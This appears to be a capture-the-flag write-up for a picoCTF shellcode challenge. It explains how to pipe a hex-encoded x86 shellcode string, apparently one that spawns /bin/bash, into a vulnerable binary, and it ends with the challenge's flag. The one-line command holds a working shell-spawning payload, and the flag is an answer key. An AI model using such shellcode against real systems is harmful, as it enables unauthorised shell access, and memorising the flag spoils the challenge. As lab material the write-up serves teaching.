# Problem
This program executes any input you give it. Can you get a shell?

# Solution
The name of the challenge was shellcode, so I know that I had to craft some shellcode or grab some online. The challenge gives us two links to download, after downloading them I saw that we had a runnable (vuln) and a .c file (vuln.c). The .c file wasn't super useful, but the runnable was, after running it I saw a seg fault and, like said in the challenge description, "will run any input". 

To solve you will just need to find some shellcode online that will open up a /bin/bash, once you have the shellcode just use python to 'print' it to the vuln file; make sure to add the command (cat), so the /bin/bash doesn't close instantly. (cat echoes back whatever you type to it if you enter in cat and have no argument).

( python -c "print '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'" ; cat ) | ./vuln


# Password 
picoCTF{shellc0de_w00h00_8b811b44}
